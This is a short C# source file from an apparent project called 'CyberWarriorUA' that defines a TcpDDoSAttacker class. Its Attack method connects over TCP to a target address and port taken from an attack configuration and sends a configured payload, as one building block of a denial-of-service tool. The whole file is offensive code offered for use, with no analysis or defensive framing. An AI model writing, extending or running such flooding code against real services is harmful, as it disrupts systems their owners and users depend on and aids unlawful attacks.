using System;
using System.Net.Sockets;
using System.Threading.Tasks;
using CyberWarriorUA.Models;

namespace CyberWarriorUA.Services
{
    public class TcpDDoSAttacker : DDoSBase
    {
        public TcpDDoSAttacker(AttackInfo attackModel) : base(attackModel)
        {
        }

        public override async Task Attack()
        {
            var tcpClient = new TcpClient();
            tcpClient.Connect(AttackModel.URL, AttackModel.Port);
            var stream = tcpClient.GetStream();

            byte[] data = System.Text.Encoding.UTF8.GetBytes(AttackModel.Message);
            await stream.WriteAsync(data, 0, data.Length);

            tcpClient.Close();
            
        }
    }
}
